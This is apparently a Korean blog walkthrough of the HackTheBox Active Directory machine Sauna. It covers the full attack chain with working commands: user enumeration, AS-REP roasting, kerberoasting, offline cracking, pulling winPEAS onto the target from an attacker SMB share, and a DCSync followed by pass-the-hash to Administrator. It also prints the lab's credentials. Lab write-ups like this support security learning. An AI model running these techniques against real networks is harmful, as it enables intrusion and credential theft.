---
title: "[HacktTheBox] walkthrough: Sauna (Active Directory)"
date: 2025-10-11
categories: [hackthebox]
tags: [htb, Windows, AD]
---

![8](/assets/images/hackthebox/sauna/스크린샷%202025-10-05%20오전%202.56.15.png)

## Info

- Platform: Hackthebox
- Machine Name: Sauna
- Target IP/Host: 10.10.10.175
- OS / Version: Windows (AD)
- Difficulty / Category: Easy

## Overview

Sauna는 초기 침투 후 내부 정보수집이 중요한 기본적인 AD 문제이다.

크게 유저 브루트포스 -> as-rep/kerberoasting -> 내부 정보 수집 -> 권한상승 으로 이어진다.

## Recon & Enummeration

먼저 네트워크 스캔을 진행하였다.
```
$ sudo nmap 10.10.10.175 -A -n --min-rate 3000
```

```
Nmap scan report for 10.10.10.175                                                                                                             01:15:45 [7/55]
Host is up (0.20s latency).                                                   
                                       
PORT     STATE SERVICE       VERSION                                          
53/tcp   open  domain        Simple DNS Plus                                  
80/tcp   open  http          Microsoft IIS httpd 10.0                                                                                                        
| http-methods:                    
|_  Potentially risky methods: TRACE                                          
|_http-title: Egotistical Bank :: Home                                        
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-04 23:14:58Z)                                                                  
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                    
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?                                                                                                                                 
464/tcp  open  kpasswd5?                                                      
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped                                                     
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped          
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found            
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose                                                  
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)                      
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)                                                                     
No exact OS matches for host (test conditions non-ideal).                     
Network Distance: 2 hops         
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
                                       
Host script results:                
| smb2-time:                                                                                                                                                 
|   date: 2025-10-04T23:15:16                                                 
|_  start_date: N/A                
| smb2-security-mode:                                                         
|   3:1:1:                                                                    
|_    Message signing enabled and required
|_clock-skew: 7h00m00s
```

스캔 결과 특별한 것은 없고, 액티브 디렉토리 사용중이며 도메인 이름이 EGOTISTICAL-BANK.LOCAL 라는 것을 확인하였다.  
`/etc/hosts` 파일에 추가해주자.
```
┌──(kali㉿kali)-[~/htb/Sauna/recon]
└─$ echo '10.10.10.175 EGOTISTICAL-BANK.LOCAL' | sudo tee -a /etc/hosts 
```

다음으로 잘못된 설정이 되어있는지 확인하기 위해 SMB null session, LDAP 익명 바인딩을 시도해보았다.

```
# smb null session을 통한 공유폴더 조회
nxc smb 10.10.10.175 -u "" -p "" --shares

# ldap 익명 바인딩을 통한 유저 조회
nxc ldap 10.10.10.175 -u "" -p "" --users
```

하지만 결과적으로 둘다 익명으로 인증은 되지만, 공유폴더나 사용자 정보가 나오지는 않았다.

다음으로 유저 브루트포스를 시도하기 위해 `kerbrute` 도구를 사용하였다.  
유저리스트는 유명한 `jsmith.txt`를 사용하였다. (https://github.com/insidetrust/statistically-likely-usernames)

```
┌──(kali㉿kali)-[~/htb/Sauna/recon]
└─$ kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL /usr/share/wordlists/jsmith.txt 
```

실행 결과 일단 두개의 유저정보를 발견하였다.

![1](/assets/images/hackthebox/sauna/스크린샷%202025-10-05%20오전%201.30.25.png)

## Initial Access

발견 한 두 계정에 대해 AS-REP Roasting이 가능한지 확인해보았고, fsmith 유저에 대해 성공하였다.
```
┌──(kali㉿kali)-[~/htb/Sauna]
└─$ impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -request -usersfile user.txt -dc-ip 10.10.10.175
```

![2](/assets/images/hackthebox/sauna/스크린샷%202025-10-05%20오전%201.31.05.png)

유저의 패스워드 기반으로 암호화된 위 AS-REP를 오프라인 크래킹을 통해 평문 패스워드를 복호화 해보자.  
`hashcat`/`john the ripper` 을 통해 크래킹이 가능하고 여기서는 john the ripper를 사용했다.
```
┌──(kali㉿kali)-[~/htb/Sauna/exploit]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt fsmith_asrep_hash
```
![3](/assets/images/hackthebox/sauna/스크린샷%202025-10-05%20오전%201.32.28.png)

유저이름과 평문 패스워드를 확보하였으므로 `winrm`을 통해 계정으로 접속해보겠다.

```
┌──(kali㉿kali)-[~/htb/Sauna/exploit]    
└─$ evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
```

![4](/assets/images/hackthebox/sauna/스크린샷%202025-10-05%20오전%201.55.14.png)

접속이 가능했고, Desktop 폴더에서 `user.txt`를 찾을 수 있었다.

## Privilege Escalation

권한 상승을 위해 먼저 확보한 계정정보를 이용하여 커버로스팅을 시도해보았다.

```
┌──(kali㉿kali)-[~/htb/Sauna/exploit]                                          
└─$ nxc ldap 10.10.10.175 -u fsmith -p Thestrokes23 --kerberoasting output.txt
```

여기서 오류가 하나 나는데, AD 환경에서 Kerberos 인증은 시간에 민감하기 때문에 공격 호스트 시간을 타겟 머신과 동일하게 맞춰줘야 한다.  
맞추는 방법은 다음과 같다.

```
sudo timedatectl set-ntp off
sudo rdate -n 10.10.10.175
```

이후 다시 커버로스팅을 시도하면 전에 브루트포스 단계에서 확인했던 `hsmith` 계정의 tgs 티켓을 확인할 수 있다.

![5](/assets/images/hackthebox/sauna/스크린샷%202025-10-05%20오전%201.56.39.png)

위 AS-REP Roasting 때와 동일하게 크래킹이 가능하다.
```
┌──(kali㉿kali)-[~/htb/Sauna/exploit]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt output.txt
```

![6](/assets/images/hackthebox/sauna/스크린샷%202025-10-05%20오전%201.57.08.png)

hsmith의 계정정보를 확보했으므로, ldap을 통해 유저 조회가 가능한지 확인해보았다.

```
nxc ldap 10.10.10.175 -u hsmith -p Thestrokes23 --users
```

![7](/assets/images/hackthebox/sauna/스크린샷%202025-10-05%20오전%202.58.50.png)

몇개의 유저 리스트를 얻을 수 있었고, 패스워드 스프레이 공격을 시도해보았으나 실패하였다.

다음으로 내부 정보수집을 시도하기 위해 다시 fsmith 계정으로 winrm을 통해 접속 후 
윈도우 내부 정보수집 도구인 `winpeas.exe`를 사용하여 정보수집을 진행하였다. (https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

먼저 공격자 호스트에 다운로드 받은 후 smb 서버를 열고, 타겟 호스트에서 다운로드 하는 방식으로 스크립트를 전송하였다.

```
# 공격자 (kali)
impacket-smbserver -smb2support test /home/kali/tools

# 타겟 (winrm)
Copy-Item -Path "\\10.10.14.8\test\winPEASx64.exe"

./winPEASx64.exe
```

![7](/assets/images/hackthebox/sauna/스크린샷%202025-10-05%20오전%202.47.10.png)
winpeas 실행 결과, 자동 로그인 계정정보에서 `svc-loanmgr`의 평문 패스워드를 찾을 수 있었다.

블러드 하운드 조회 결과 svc-loanmgr 계정은 도메인에 대해 GetChangesAll 권한이 있으므로 DCSync 가능.  (블러드 하운드 실행 명령어는 생략, [Forest 풀이 확인](https://eveses.github.io/hackthebox/hackthebox-forest/))

![10](/assets/images/hackthebox/sauna/스크린샷%202025-10-05%20오전%203.02.42.png)

마지막으로 DCSync를 통해 관리자 NTLM 해시를 탈취하였고 winrm을 통해 관리자로 접속 가능했다.

```
┌──(kali㉿kali)-[~/htb/Sauna/priv]
└─$ impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175

evil-winrm -i 10.10.10.175 -u administrator -H <hash>
```
![11](/assets/images/hackthebox/sauna/스크린샷%202025-10-05%20오전%203.03.22.png)

![12](/assets/images/hackthebox/sauna/스크린샷%202025-10-05%20오전%203.03.38.png)
관리자 Desktop 폴더에서 root.txt를 찾을 수 있다.